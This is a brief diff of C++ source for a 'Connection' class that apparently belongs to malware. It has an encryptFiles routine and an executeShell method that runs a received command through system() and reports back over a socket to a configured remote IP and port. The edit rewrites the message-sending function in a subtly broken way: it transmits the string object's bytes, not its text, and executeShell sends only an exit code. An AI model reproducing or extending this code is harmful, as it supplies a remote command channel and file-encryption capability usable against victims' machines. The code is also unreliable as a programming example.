@@ -12,8 +12,8 @@ Connection::Connection(string ip, unsigned int port) {
 
 }
 
-void Connection::sendMessage(auto *message , SOCKET socket) {
-    send(socket, reinterpret_cast<const char *>(message), message->size(), 0);
+void Connection::sendMessage(const string message, SOCKET socket) {
+    send(socket, reinterpret_cast<const char *>(&message), sizeof(message), 0);
     return;
 }
 
@@ -104,7 +104,7 @@ void Connection::encryptFiles(string path) {
 
 void Connection::executeShell(string shell) {
     string output = to_string(system(shell.c_str()));
-    sendMessage(&output);
+    sendMessage(output, sock);
     return;
 }
 
